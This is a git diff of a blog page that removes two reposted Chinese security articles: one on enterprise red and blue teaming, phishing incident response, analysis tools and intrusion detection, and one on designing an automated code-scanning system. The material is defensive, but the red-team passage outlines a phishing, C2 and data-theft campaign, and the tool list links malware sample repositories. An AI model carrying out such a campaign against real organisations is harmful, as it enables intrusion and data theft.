@@ -189,179 +189,15 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-
-        <br>
-        <span id="busuanzi_container_page_pv">
-          阅读次数<span id="busuanzi_value_page_pv"></span>
-        </span>
         <blockquote>
 <p>转自  <a href="https://mp.weixin.qq.com/s/quwaJMVHYpBAXpkgtR12Kw" target="_blank" rel="noopener">安全小飞侠 https://mp.weixin.qq.com/s/quwaJMVHYpBAXpkgtR12Kw</a> </p>
 </blockquote>
-<ul>
-<li>目录<br>{:toc}</li>
-</ul>
 <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>本文主要是介绍一下笔者对于甲方安全能力建设的一些经验，心得和零散的思考。需要特别强调的是不同企业的实际情况不尽相同，本文仅供参考，不具普遍意义。</p>
-<h2 id="0x01-Red-Teaming"><a href="#0x01-Red-Teaming" class="headerlink" title="0x01 Red Teaming"></a>0x01 Red Teaming</h2><p>近几年随着Red Team建设的话题越来越流行，不管是甲方或者乙方都在极力的发展自己的Red Teaming能力，尤其是各个乙方都推出了自己的Red Team的服务，如：<a href="https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/pf/ms/ds-red-team-for-security-operations.pdf" target="_blank" rel="noopener">FireEye</a>，但是最终目的都是为甲方输出检验企业的Detection和Response的能力，找到防御弱点进而优化防御系统和流程。</p>
-<p>我们不禁要思考一下，到底什么样的企业才真的需要Red Team？当然，输出安全能力和服务的乙方不在讨论范围内，因为其最终是为了服务和支持甲方。根据我的观察和发现，目前大部分人很容易把Red Team和Penetration Testing弄混或者干脆混为一谈。其实二者有共同点但也有本质上的不同，简单做个比喻就是忍者(隐秘，快速，准确，一击即中)和海盗（强壮，贪婪，可以刚正面，一波高地）的区别，各有侧重和优劣，但侧重点不同，比如，Red Team类似忍者，侧重于精心准备（如：社会工程学等）收集信息进而绕过现有的防御体系（类似于APT）来检验防御和检测能力；而Penetration Testing则如同海盗，侧重于尽可能多地发现应用，系统，网络，设备等的漏洞，并利用其发现更深层或者复杂的漏洞从而来评估风险。所以，答案显而易见，一个企业只有拥有了基本的防御和检测的能力，并需要持续检测和改善这种能力时，Red Team就是很好地选择了。</p>
-<p>那么，什么样的Red Team才算合格和有效呢？如前面所说，Red Team如同忍者去做暗杀，既然暗杀那么就需要一个详细的计划，如：目标是什么（暗杀对方头目），手段是什么（前期侦查对方大本营，守卫布局，对方头目的日常习惯和出现的场所，会不会功夫等），如何去执行（选择某个夜黑风高的晚上，众人都准备或者已经睡觉的时候，摸进对方大本营，提前隐藏在对方头目习惯出现的场所，等待其出现，再一刀毙命）。对应到Red Team就是，</p>
-<ol>
-<li><p>设置好这次行动目的是模拟偷取公司的客户资料；</p>
-</li>
-<li><p>提前做好侦查看看公司都可能有哪些人会碰到这类数据，有哪些防御检测方式（如：反病毒，入侵检测，流量分析）；</p>
-</li>
-<li><p>针对可能接触数据的人员做定向钓鱼攻击或者面对面的社工，安装专门制作的绕杀软的工具，利用常见的社交或者云存储网站来做C2，等待时机控制机器，获取必要的用户凭证，盗取客户资料，销毁痕迹，最终走人。</p>
-</li>
-</ol>
-<p>因此，一个合格的Red Team，需要具备模拟攻击者入侵的各种能力，手段以及假想的目的。想要具备这种能力的一个最简单有效的方法，就是从现有的真实世界里发生的APT攻击活动中抽取TTP来模拟真实的threat actors，分类并总结他们曾今采用的手段，方法，技术和工具，然后加以优化和改进，最终结合每个Red Team活动的假想目的来模拟不同APT组织对于公司的入侵，以此来检测已有的防御和响应体系是否有效。</p>
-<h2 id="0x02-Blue-Teaming"><a href="#0x02-Blue-Teaming" class="headerlink" title="0x02 Blue Teaming"></a>0x02 Blue Teaming</h2><p>我们在说Blue Team时，通常是指在一个企业里负责入侵检测和应急响应的团队的统称，一般情况下（尤其是规模较大的企业）会至少细分为以下几个团队：</p>
-<ul>
-<li><p>Threat Hunting（入侵检测）：主要负责根据已知威胁的TTP（如APT活动）和根据常见入侵活动的行为特征（如批量端口扫描，同一系统账户的短时多次尝试登录，office软件进程的可疑子进程的派生等等）来开发入侵检测规则，或者利用机器学习，深度学习等更高级的数据挖掘技术来研究和分析威胁特征；</p>
-</li>
-<li><p>Incident Response（应急响应）：主要负责处理和调查企业的安全事件（如：外部应用系统被入侵，内网主机被入侵，以及由Threat Hunting的规则触发的各类入侵报警等）以及从真实的安全事件中来分析和提取资产的IOC以及最新的威胁特征；</p>
-</li>
-<li><p>Vulnerability Management（漏洞管理）：主要负责对企业所有资产（包括应用和原代码）的持续漏洞扫描，追踪，修复以及管理；</p>
-</li>
-<li><p>Threat Intelligence（威胁情报）：主要负责追踪和分析外部已知APT活动，地下黑市和深网或暗网里的各种威胁情报信息，并加以分类总结成TTP以及IOC提供给其他团队加以利用和深层分析（如前面提到的Threat Hunting，以及Red Team）。</p>
-</li>
-</ul>
-<p>而且这些子团队都不是独立工作的，其之间都是相互配合和支持的。我们可以举个常见的例子来加以解释一下，比如threat hunting可能会通过已知的规则发现了一个可能的入侵行为；接着incident response迅速跟进进行流量、日志或者取证的分析发现了之前未被识别的威胁特征；然后threat hunting基于该特征开发最新的检测规则，threat intelligence以此进行情报梳理和比对并最终发现这是某个最近比较活跃的APT组织的活动，随后搜集相关TTP反馈给threat hunting；最后，vulnerability management团队扫描企业所有可能存在弱点和受影响资产，追踪和修复。</p>
-<p>综上可见，Blue Team不是gank选手，而是讲究的团队合作和相互配合的团战协作，合理的利用和集合各个子团队的优势便可以大大提高入侵检测的准确性和应急响应的快速性。</p>
-<h2 id="0x03-应急响应"><a href="#0x03-应急响应" class="headerlink" title="0x03 应急响应"></a>0x03 应急响应</h2><p>在开始之前，先谈谈我个人理解的应急响应是什么？顾名思义就是对企业发生的安全事件作出快速应对和及时响应从而减少由于安全事件造成的影响。</p>
-<p>一般情况下，任何安全事件的应急响应都可以分为以下几个阶段：</p>
-<ol>
-<li><p>Assessment（评估）：主要是初步梳理安全事件产生的原因和评估潜在影响范围；</p>
-</li>
-<li><p>Containment（控制）：这个阶段主要是快速找到止损/减轻方案（或者是临时应对措施）将事件影响尽可能控制在最小范围内；</p>
-</li>
-<li><p>Eradication（消除）：这个阶段是要找到安全事件产生的根本原因并提出和实施根治方案；</p>
-</li>
-<li><p>Recovery（恢复）：主要是确保所有受影响的系统或者服务完全恢复到安全状态；</p>
-</li>
-<li><p>Review（总结和审查）：这是每个应急响应的最后阶段主要是总结和梳理安全事件处理和响应的整个时间线和应对方案，学习和审查安全事件产生的根本原因并生成知识库以便以后遇到同类安全事件可以快速地找到处理和应对的方法。</p>
-</li>
-</ol>
-<p>为了便于大家更好地理解怎么运用以上这些步骤来帮助我们做好应急响应，以下我以一个企业经常会碰到的钓鱼邮件为案例。比如，我们的企业员工上报了一封钓鱼邮件，那么作为应急响应团队应该怎么做？我们都知道钓鱼邮件是入侵者（APT组织）攻击大型企业的最直接有效的方法。当我们的应急响应人员遇到这样的攻击试图时，</p>
-<p>第一步，我们要初步分析钓鱼邮件的攻击方法，通常有：</p>
-<ul>
-<li><p>Credential Harvesting：设置一个伪造的邮箱或者系统登录界面（如发送一个诱饵链接或者在邮件里嵌入一个html页面）来盗取有效的用户名和密码；</p>
-</li>
-<li><p>Malware：一般包括两种方式，一是通过附件直接发送恶意文件，二是通过发送链接来诱骗用户点击下载恶意文件。初步分析了攻击方法，我们就需要评估影响，比如，哪些人收到了该邮件，哪些人可能访问了恶意链接，哪些人下载了恶意文件，哪些人执行了恶意文件，哪些数据可能受到影响等等；</p>
-</li>
-</ul>
-<p>第二步，实施控制措施或者减轻方案，如针对通过链接来偷取用户名和密码或者下载第一阶段的恶意文件的域名我们可以实施DNS sinkhole（详情可以参照：<a href="https://en.m.wikipedia.org/wiki/DNS_sinkhole），对于利用附件直接发送恶意文件的情况我们可以通过静态或者动态沙箱（例如cuckoo，virustotal等）来分析恶意文件的行为并抽取IOC（可能是后续阶段C2的域名或者IP，亦或者是执行的子命令）实施DNS" target="_blank" rel="noopener">https://en.m.wikipedia.org/wiki/DNS_sinkhole），对于利用附件直接发送恶意文件的情况我们可以通过静态或者动态沙箱（例如cuckoo，virustotal等）来分析恶意文件的行为并抽取IOC（可能是后续阶段C2的域名或者IP，亦或者是执行的子命令）实施DNS</a> sinkhole，防火墙IP黑名单，或者终端防安全防护软件添加行为识别特征或者文件hash黑名单等等措施；</p>
-<p>第三步，当恶意行为被有效控制后，我们便需要实施清除活动，如：清除所有收到的恶意邮件，对访问过恶意链接并且可能潜在泄露过用户名和密码的用户进行账号重置，对于下载执行过恶意文件或者访问过后续阶段的域名或者IP的用户电脑进行重装等等；</p>
-<p>第四步，这个阶段我们需要确保我们在第三步中的所有清除活动按照预期完成，并且所有用户和系统恢复正常使用；</p>
-<p>第五步，当一切恢复正常，我们需要对这次的钓鱼邮件事件做复盘分析，如：为什么我们的邮件安全网关没有检测到和拦截这个钓鱼邮件？为什么我们的员工会点击这些钓鱼邮件？我们的防御和检测的漏洞在哪？下次再发生类似事件我们应该怎么办？等这些问题都找到对应的答案了我们则需要录入应急响应知识库以备后用。</p>
-<p>综上，一个有效的应急响应是需要一个相对完整的流程来保证，如此一来便可以保证应急时不慌乱有条理且快速有效。</p>
-<h2 id="0x04-内网入侵检测与防御"><a href="#0x04-内网入侵检测与防御" class="headerlink" title="0x04 内网入侵检测与防御"></a>0x04 内网入侵检测与防御</h2><p>本章节将依据我个人的一些工作经验和思考分别从平台搭建，工具配置，入侵调查与分析三个方面来聊聊企业的内网入侵检测和防御的建设思路。</p>
-<h3 id="平台篇"><a href="#平台篇" class="headerlink" title="平台篇"></a>平台篇</h3><p>通常来说，一个企业要想做好内网检测和防御，首先要解决的问题就是感知能力，这就好比是人的五官要可以感知到周遭环境的变化，那么反映到安全平台上我们就需要一个统一的日志收集和分析平台。那么需要收集哪些日志呢？是所有的都收集吗？还是有选择性地收集？又如何来确定优先级呢？其实日志的收集切忌盲目全收，否则就会浪费了大量的人力物力财力到头来搜集了一堆日志却不知道如何使用。最好是结合应用场景来制定优先级，循序渐进。举个例子，比如当我们的一个应用场景是检测办公网中的入侵行为，我们需要解决的核心问题其实就是 <strong>谁在什么时间什么机器上运行了什么进程做了什么操作</strong>。分解一下这个问题，首先我们需要有日志能帮我们定位每个内网用户，如：DHCP，DNS，Kerberos Tickets（AD认证），Windows Event Logs，Antivirus等；接着我们想要知道什么时间什么机器上运行了什么，如：主机进程树和网络连接日志（即：Event Tracing for Windows）等；最后我们需要知道做了什么操作（网络行为等），如：网络设备出口流量，Web网关日志（HTTP流量），IDS日志，WiFi日志，邮件网关日志等等。这样，我们就能有针对性地收集我们当下最需要的日志并可以利用这种方法来逐步扩大日志收集的种类。</p>
-<p>有了统一的日志收集平台，接下来我们便需要一个持续的威胁检测平台其主要作用就是编写各种检测规则和机器学习模型来对所有收集到的日志进行匹配检查以保证之前的已知威胁不会被忽略。</p>
-<p>接着，我们需要一个IOC检测平台，其主要作用是用来对外部情报信息或者内部自产的情报信息进行实时匹配和报警以确保当前所有的已知威胁能被检测出来。</p>
-<p>最后，我们还需要一个内部威胁追踪和记录平台，其主要作用是用于流程化和规范化地记录和总结所有以往发生的入侵事件的调查过程和分析结果以便于日后查询和关联分析。</p>
-<p>总之，安全平台建设是企业内网入侵检测和防御的基础，只有搭建了这些基础平台，才能谈后续的工具配置和入侵分析与调查。</p>
-<h3 id="工具篇"><a href="#工具篇" class="headerlink" title="工具篇"></a>工具篇</h3><p>在上一篇中我们聊到安全平台建设是企业内网入侵检测和防御的基础，在这个基础之上今天我们来聊聊工具配置。简而言之，就是有了感知能力，需要哪些工具来帮助我们分析和调查入侵，所谓工欲善其事必先利其器。</p>
-<p>一般来说，最常见的入侵内网的手法就是钓鱼邮件和社工，而其中以钓鱼邮件最为典型，因此做好钓鱼邮件的防范是最为简单有效的防御内网入侵的方法。我之前曾提到过钓鱼邮件的常见手法，</p>
-<ul>
-<li><p>发送链接模拟邮箱或者内部系统登陆界面收集企业员工的账号密码；</p>
-</li>
-<li><p>发送链接诱导员工点击下载恶意的office文档；</p>
-</li>
-<li><p>直接发送恶意的office文档或者PE文件或者恶意程序的压缩包作为附件并诱导员工打开。</p>
-</li>
-</ul>
-<p>针对以上几种手法，我们至少准备以下几类工具来辅助分析。</p>
-<p><strong>第一类，域名与IP检测工具：</strong></p>
-<p><a href="https://centralops.net/co/DomainDossier.aspx?dom_whois=1&amp;net_whois=1&amp;dom_dns=1" target="_blank" rel="noopener">https://centralops.net/co/DomainDossier.aspx?dom_whois=1&amp;net_whois=1&amp;dom_dns=1</a></p>
-<p><a href="https://www.threatcrowd.org/" target="_blank" rel="noopener">https://www.threatcrowd.org/</a></p>
-<p><a href="https://www.threatminer.org/" target="_blank" rel="noopener">https://www.threatminer.org/</a></p>
-<p><a href="https://www.virustotal.com/en/" target="_blank" rel="noopener">https://www.virustotal.com/en/</a></p>
-<p><a href="https://www.talosintelligence.com/" target="_blank" rel="noopener">https://www.talosintelligence.com/</a></p>
-<p><a href="https://login.opendns.com/" target="_blank" rel="noopener">https://login.opendns.com/</a></p>
-<p><a href="https://www.alexa.com/siteinfo" target="_blank" rel="noopener">https://www.alexa.com/siteinfo</a></p>
-<p><a href="https://x.threatbook.cn/en" target="_blank" rel="noopener">https://x.threatbook.cn/en</a></p>
-<p><a href="https://checkphish.ai/domain/avfisher.win" target="_blank" rel="noopener">https://checkphish.ai/domain/avfisher.win</a></p>
-<p><strong>第二类，URL检测工具：</strong></p>
-<p><a href="https://urlscan.io/" target="_blank" rel="noopener">https://urlscan.io/</a></p>
-<p><a href="https://sitecheck.sucuri.net/results/pool.cortins.tk" target="_blank" rel="noopener">https://sitecheck.sucuri.net/results/pool.cortins.tk</a></p>
-<p><a href="https://quttera.com/" target="_blank" rel="noopener">https://quttera.com/</a></p>
-<p><a href="https://www.virustotal.com/en/" target="_blank" rel="noopener">https://www.virustotal.com/en/</a></p>
-<p><a href="https://checkphish.ai/" target="_blank" rel="noopener">https://checkphish.ai/</a></p>
-<p><strong>第三类，TOR节点检测工具：</strong></p>
-<p><a href="https://www.dan.me.uk/torcheck" target="_blank" rel="noopener">https://www.dan.me.uk/torcheck</a></p>
-<p><a href="https://exonerator.torproject.org/" target="_blank" rel="noopener">https://exonerator.torproject.org/</a></p>
-<p><a href="https://ipduh.com/ip/tor-exit/" target="_blank" rel="noopener">https://ipduh.com/ip/tor-exit/</a></p>
-<p><a href="https://torstatus.blutmagie.de/" target="_blank" rel="noopener">https://torstatus.blutmagie.de/</a></p>
-<p><strong>第四类，在线恶意程序或文档检测工具：</strong></p>
-<p><a href="https://www.virustotal.com/en/" target="_blank" rel="noopener">https://www.virustotal.com/en/</a></p>
-<p><a href="https://malwr.com/" target="_blank" rel="noopener">https://malwr.com/</a></p>
-<p><a href="http://camas.comodo.com/" target="_blank" rel="noopener">http://camas.comodo.com/</a></p>
-<p><a href="https://x.threatbook.cn/en" target="_blank" rel="noopener">https://x.threatbook.cn/en</a></p>
-<p><a href="https://www.reverse.it/" target="_blank" rel="noopener">https://www.reverse.it/</a></p>
-<p><a href="http://www.threatexpert.com/submit.aspx" target="_blank" rel="noopener">http://www.threatexpert.com/submit.aspx</a></p>
-<p><a href="https://www.vicheck.ca/" target="_blank" rel="noopener">https://www.vicheck.ca/</a></p>
-<p><a href="https://virusshare.com/" target="_blank" rel="noopener">https://virusshare.com/</a></p>
-<p><a href="https://malshare.com/" target="_blank" rel="noopener">https://malshare.com/</a></p>
-<p><a href="https://github.com/ytisf/theZoo" target="_blank" rel="noopener">https://github.com/ytisf/theZoo</a></p>
-<p><strong>第五类，动态恶意程序或文档分析工具：</strong></p>
-<p>Cuckoo: <a href="https://github.com/cuckoosandbox/cuckoo" target="_blank" rel="noopener">https://github.com/cuckoosandbox/cuckoo</a></p>
-<p>Regshot: <a href="https://sourceforge.net/projects/regshot/" target="_blank" rel="noopener">https://sourceforge.net/projects/regshot/</a></p>
-<p>Process Hacker: <a href="http://processhacker.sourceforge.net/" target="_blank" rel="noopener">http://processhacker.sourceforge.net/</a></p>
-<p>Process Monitor: <a href="https://technet.microsoft.com/en-us/sysinternals/processmonitor.aspx" target="_blank" rel="noopener">https://technet.microsoft.com/en-us/sysinternals/processmonitor.aspx</a></p>
-<p>ProcDOT: <a href="https://www.cert.at/downloads/software/procdot_en.html" target="_blank" rel="noopener">https://www.cert.at/downloads/software/procdot_en.html</a></p>
-<p>WinDump: <a href="https://www.winpcap.org/windump/" target="_blank" rel="noopener">https://www.winpcap.org/windump/</a></p>
-<p>Graphviz: <a href="http://www.graphviz.org/Download..php" target="_blank" rel="noopener">http://www.graphviz.org/Download..php</a></p>
-<p>Capture-BAT: <a href="https://www.honeynet.org/node/315" target="_blank" rel="noopener">https://www.honeynet.org/node/315</a> (x86 environment only)</p>
-<p>Fakenet: <a href="https://sourceforge.net/projects/fakenet/" target="_blank" rel="noopener">https://sourceforge.net/projects/fakenet/</a></p>
-<p>Wireshark: <a href="https://www.wireshark.org/#download" target="_blank" rel="noopener">https://www.wireshark.org/#download</a></p>
-<p><strong>第六类，邮件检测工具：</strong></p>
-<p><a href="http://spf.myisp.ch/" target="_blank" rel="noopener">http://spf.myisp.ch/</a></p>
-<p><strong>第七类，Google搜索</strong>，这也是最简单暴力但却十分有效的工具之一。</p>
-<p>在分析内网入侵时合理地使用以上这些工具往往会有事半功倍的效果。另外，作为一个入侵分析和响应工程师切忌在没有网络隔离的情况下在办公电脑上直接访问可疑链接或者分析恶意样本文件。</p>
-<h3 id="分析篇"><a href="#分析篇" class="headerlink" title="分析篇"></a>分析篇</h3><p>在前两篇中，我们分别谈到了企业内网入侵检测和防御所需要的安全平台建设和工具配置，有了这些基础我们便来聊聊如何运用这些已有的平台和工具来分析真实的内网入侵事件。</p>
-<p>为了更好的说明这个问题，我将仍以最常见的利用钓鱼邮件入侵企业员工电脑并进而入侵内网为例来说明如何分析这类的入侵事件。为了能够检测和分析这类入侵事件，我们需要有能力获得最原始的钓鱼邮件，这就需要我们从至少以下几个途径来获取：</p>
-<ul>
-<li><p>企业员工主动提交可疑的钓鱼邮件，这就需要员工具备一定的安全意识（安全意识培训的重要性），以及统一的可疑邮件提交平台（需要开发成本）</p>
-</li>
-<li><p>邮件安全网关，如：Ironport，FireEye Email Security等</p>
-</li>
-<li><p>IOC检测平台，及时检测已知的恶意域名或者IP，可疑的发件人，恶意附件等</p>
-</li>
-</ul>
-<p>当我们拿到了原始的钓鱼邮件，首先需要确保将其转化成EML文本格式（可用工具<a href="https://github.com/mvz/msgconvert），接着，我们至少需要从以下几个方面来分析：" target="_blank" rel="noopener">https://github.com/mvz/msgconvert），接着，我们至少需要从以下几个方面来分析：</a></p>
-<ol>
-<li><p>原始邮件头，包括：From, envelope-from, SPF, client-ip等</p>
-<p> 1.1 可以通过dig命令，如：dig -t txt baidu.com，或使用工具<a href="https://github.com/BishopFox/spoofcheck" target="_blank" rel="noopener">spoofcheck</a>来检查邮件域名是否可以被spoof了</p>
-<p> 1.2 对比From和envelope-from是否一致，也是应该判断是否为恶意邮件的有效方法</p>
-</li>
-<li><p>原始邮件正文，包括：域名／IP，URL，附件等</p>
-<p> 2.1 域名/IP和URL的分析可以使用工具篇里提到的相应工具来分析，判断是否存在multi-stage C&amp;C</p>
-<p> 2.2 附件的分析也可以使用工具篇里提到的在线／本地恶意程序分析沙箱或者自行逆向分析，进而了解恶意程序的执行逻辑以及对应的IOC(域名，URL，文件，注册表键值，执行的系统命令等)</p>
-<p> 2.3 利用日志分析平台，查询恶意域名的DNS或者HTTP(S)流量日志，结合主机EDR（Endpoint Detection and Response）终端日志将DNS请求关联到相应的主机进程，如：ETW for Windows，BCC/eBPF for Linux等</p>
-<p> 2.4 查询触发恶意域名的DNS请求的主机进程的整个进程树，分析malware完整的执行链，例如：outlook.exe -&gt; winword.exe -&gt; cmd.exe -&gt; powershell.exe</p>
-<p> 2.5 查询所有触发了上述执行链的受感染主机，并重复2.4 的步骤直到没有新的执行链被发现为止</p>
-</li>
-</ol>
-<p>在分析完了以上这些，我们就可以添加对应的防御和检测措施了，例如：</p>
-<ol>
-<li><p>通过应急响应章节中提到的DNS Sinkhole来阻断所有恶意域名的DNS请求</p>
-</li>
-<li><p>确保终端反病毒程序可以检测并清理每个阶段的恶意文件</p>
-</li>
-<li><p>添加防火墙规则来阻止内网主机对恶意IP地址的访问</p>
-</li>
-<li><p>隔离重装已经感染的主机进行</p>
-</li>
-<li><p>重置受感染内网用户的登录凭证</p>
-</li>
-<li><p>删除所有企业用户收到的来自同一恶意发送者的邮件</p>
-</li>
-<li><p>将分析得出的IOC添加到IOC检测平台</p>
-</li>
-<li><p>依据已发现的Malware执行链添加新的入侵检测规则</p>
-</li>
-</ol>
-<p>至此，我已简单地介绍了一个相对完整的针对利用钓鱼邮件入侵企业员工电脑并进而入侵内网的入侵事件的分析和防御的方法与流程。 </p>
-
+        
+          <p class="article-more-link ">
+            <a href="/甲方安全建设的一些思路和思考/#more"><i class="fa fa-coffee" style="padding-right: 2px"></i>Read More</a>
+          </p>
+        
       
 
     </div>
@@ -372,7 +208,7 @@
 
     <footer class="article-footer">
       
-        <a data-url="http://pa55w0rd.github.io/甲方安全建设的一些思路和思考/" data-id="cjopkqnsi002qj3t6xmoku9l5" class="article-share-link" data-share="baidu" data-title="甲方安全建设的一些思路和思考 （转发）">分享到</a>
+        <a data-url="http://pa55w0rd.github.io/甲方安全建设的一些思路和思考/" data-id="cjopl5zvi002skbt6ihfu25qd" class="article-share-link" data-share="baidu" data-title="甲方安全建设的一些思路和思考 （转发）">分享到</a>
       
 
       
@@ -432,326 +268,17 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-
-        <br>
-        <span id="busuanzi_container_page_pv">
-          阅读次数<span id="busuanzi_value_page_pv"></span>
-        </span>
         <p>转自</p>
 <blockquote>
 <p><a href="https://mp.weixin.qq.com/s/tSbWhBh9RQQ5Wduoo18MEg" target="_blank" rel="noopener">代码自动化扫描系统的建设- 唯品会安全应急响应中心</a></p>
 </blockquote>
-<ul>
-<li>目录<br>{:toc}</li>
-</ul>
 <h2 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h2><h3 id="为什么需要自动化扫描？"><a href="#为什么需要自动化扫描？" class="headerlink" title="为什么需要自动化扫描？"></a>为什么需要自动化扫描？</h3><p>互联网的快速发展，程序员是功不可没的。从软件开发的瀑布模型到现在的敏捷开发, 软件的开发周期从数年到数月、从数月到数天，时间不断变换缩减。传统的代码扫描方式已经不能跟进新时代的软件开发流程中，这就需要改变我们的代码扫描方式，它应该在有限的时间内尽量发现足够多的安全问题，并能够结合 [<code>CI (持续集成)</code>]来触发代码扫描。</p>
-<h3 id="自动化扫描时扫描引擎用什么？"><a href="#自动化扫描时扫描引擎用什么？" class="headerlink" title="自动化扫描时扫描引擎用什么？"></a>自动化扫描时扫描引擎用什么？</h3><p>你可以使用任何提供 API 接口的开源或商业的扫描引擎。这里我们把“扫描引擎”(指第三方的审计工具)与“自动化系统”剥离(解耦)开来，“扫描引擎”只负责安全漏洞扫描；“自动化系统”负责漏洞收集、分析、处理等动作。同时你也可以通过“自动化系统”的后台来添加一些安全规则。</p>
-<h3 id="怎么触发自动化扫描？"><a href="#怎么触发自动化扫描？" class="headerlink" title="怎么触发自动化扫描？"></a>怎么触发自动化扫描？</h3><p>两种方式：</p>
-<ul>
-<li>管理后台手动触发</li>
-<li>CI(持续集成)/[CD(持续交付)]系统中触发</li>
-</ul>
-<h3 id="如何解决漏报和误报？"><a href="#如何解决漏报和误报？" class="headerlink" title="如何解决漏报和误报？"></a>如何解决漏报和误报？</h3><p>两种方式：</p>
-<p>“<code>基于规则</code>”和“<code>基于插件</code>”，这里使用白名单表示误报、使用黑名单表示漏报。</p>
-<p><strong>基于规则</strong></p>
-<p>这里的规则是指基于文本的处理方式，如：使用正则表达式来匹配文件中的某些特征，使用字符串来判断是否存在敏感信息等。</p>
-<p><em>PS: 这里有一些细节需要注意。</em></p>
-<ul>
-<li><p>正则表达式：</p>
-<ul>
-<li>是否区分大小写</li>
-<li>是否支持多行匹配</li>
-</ul>
-</li>
-<li><p>字符串：</p>
-<ul>
-<li>是否首部包含</li>
-<li>是否尾部包含</li>
-<li>是否在当前字符串中</li>
-</ul>
-</li>
-</ul>
-<p><strong>基于插件</strong></p>
-<p>插件的自由度较大，其本质是把要扫描的文件信息作为插件执行入口的上下文，文件信息包括：路径、名称、内容等。你也可以在插件中写一些判断逻辑或调用第三方工具。</p>
-<h3 id="漏报率和误报率怎么样？"><a href="#漏报率和误报率怎么样？" class="headerlink" title="漏报率和误报率怎么样？"></a>漏报率和误报率怎么样？</h3><p>漏报率暂时无法很好的测量， <code>漏报率 = 漏报数/(漏洞数+漏报数) × 100%</code> 而实际中很少有人(这里指非安全审计人员)会发现漏报，理论上你写的规则或插件越多越会减少漏报。</p>
-<p>误报是可以通过白名单规则或插件处理的，理论上可以百分百消除误报，但是需要手动进行设置。</p>
-<h3 id="Web-通用型漏洞可以都覆盖么？"><a href="#Web-通用型漏洞可以都覆盖么？" class="headerlink" title="Web 通用型漏洞可以都覆盖么？"></a>Web 通用型漏洞可以都覆盖么？</h3><p>Web 通用型漏洞以 <code>OWASP 2017 TOP 10</code> 为例，其大多数都在黑盒测试的范围内。适用白盒测试仅限于：“<code>A3:2017-Sensitive Data Exposure</code>”、“<code>A9:2017-Using Components with Known Vulnerabilities</code>”，而这两项也是我们自动化扫描系统的基本要求。</p>
-<h3 id="扫描出来的漏洞如何形成闭合？"><a href="#扫描出来的漏洞如何形成闭合？" class="headerlink" title="扫描出来的漏洞如何形成闭合？"></a>扫描出来的漏洞如何形成闭合？</h3><p>这需要结合公司自身的软件开发方式而定，大多数公司采用“<code>Gitlab</code>” + “<code>Confluence</code>” + “<code>Jira</code>” + “<code>Jenkins</code>”的工作方式，那么我们可以通过 <code>Jira</code> 或 <code>Gitlab</code>的 API 接口来创建问题工单。</p>
-<h2 id="0x01-设计要求"><a href="#0x01-设计要求" class="headerlink" title="0x01 设计要求"></a>0x01 设计要求</h2><h3 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h3><p><strong>系统功能：</strong></p>
-<ul>
-<li>尽量发现足够多的安全问题<ul>
-<li>硬编码问题</li>
-<li>敏感信息泄露</li>
-<li>使用存在已知漏洞的组件</li>
-<li>危险函数识别</li>
-</ul>
-</li>
-<li>可集成第三方扫描引擎</li>
-<li>可自动化处理误报</li>
-<li>可通过 CI 方式触发扫描</li>
-<li>可根据条件自动创建 Issue</li>
-</ul>
-<p><strong>扫描目标主要分为两种：</strong></p>
-<p>一种为线上 Git 扫描；一种为离线扫描。</p>
-<p>“<code>线上 Git 扫描</code>” 其主要应用场景为企业内部使用如 Gitlab 这种代码托管系统，我们定时同步 Gitlab 上的项目信息，通过 CI 来调用 API 接口进行扫描，自动化扫描就是这种模式，其执行流程为：<code>“后台服务定时同步项目” -&gt; &quot;API接口下发扫描任务&quot; -&gt; “后台调度执行扫描”</code>。</p>
-<p>“<code>离线扫描</code>”其形式为审计人员手动上传一个 zip 或 rar 的源码包，扫描系统自动解压后进行代码扫描。</p>
-<p>这两种模式的执行流程略有不同，所以后端实现也略有不同，第一种的执行流程要比第二种较为复杂，我们这里会以第一种方式来实现自动化扫描。</p>
-<h3 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h3><p><strong>系统要求：</strong></p>
-<ul>
-<li>单个项目扫描控制在 20 分钟以内</li>
-<li>支持调度节点监控</li>
-<li>支持漏洞知识库管理</li>
-<li>支持 API 接口</li>
-<li>支持分布式部署, 方便扩展来提升扫描能力</li>
-</ul>
-<p>时间控制是为了保证 CI/CD 过程不会太长，避免影响项目发布。调度节点监控，这里存在两种情况：一种是调度进程的心跳监控；一种为扫描任务的超时监控。漏洞知识库主要为了与组件分析模块分析出的依赖组件进行漏洞匹配。API 接口是为了方便第三方(代指CI/CD)调用来下发扫描任务或查询结果。分布式部署方式，可以水平扩展来提高调度节点和API节点的处理速度与能力。</p>
-<h3 id="模块设计"><a href="#模块设计" class="headerlink" title="模块设计"></a>模块设计</h3><p><strong>主要系统：</strong></p>
-<ul>
-<li>代码托管子系统</li>
-<li>自动化扫描子系统</li>
-<li>第三方扫描子引擎</li>
-</ul>
-<p>这里从整体角度来观察，大致分为三个子系统，<code>自动化扫描子系统</code>依赖<code>代码托管子系统</code>，但不依赖<code>扫描引擎(泛指第三方商业或开源审计产品)子系统</code>，这是由于<code>自动化扫描子系统</code>内部集成了组件漏洞识别、黑白名单规则、黑白名单插件等功能，最后我们用一张图来说明。</p>
-<p><img src="\assets\img\auto_scan\1.png" alt=""></p>
-<p>这里主要介绍了自动扫描系统的背景和要实现的目标，下面我们将会详细介绍各个层与模块的设计。</p>
-<h2 id="0x02-系统设计"><a href="#0x02-系统设计" class="headerlink" title="0x02 系统设计"></a>0x02 系统设计</h2><h3 id="1-基础准备"><a href="#1-基础准备" class="headerlink" title="1 基础准备"></a>1 基础准备</h3><p>这里我们主要使用 Linux 来搭建我们的自动化扫描系统，按照设计的角色划分，我们这里需要三台 CentOS 7 的服务器，当然服务器可以是物理设备也可以是虚拟机，如果公司内部的扫描项目较多或为以后扩展考虑意见使用物理机。<br>服务器数量|操作系统|扫描引擎|数据库|开发语言|角色<br>–|–|–|–|–|–|<br>3台|CentOS 7| SonarQube | MySQL| Python| - UI+MySQL+MQ<br>- 扫描节点<br>- 第三方引擎（SonarQube）</p>
-<p><strong>服务器划分:</strong></p>
-<p>这里我们假定一个 codeaudit 域, 三台服务器的主机名称分别为：</p>
-<ul>
-<li>ui.codeaudit: 负责后台管理系统的部署，包括数据库、MQ。</li>
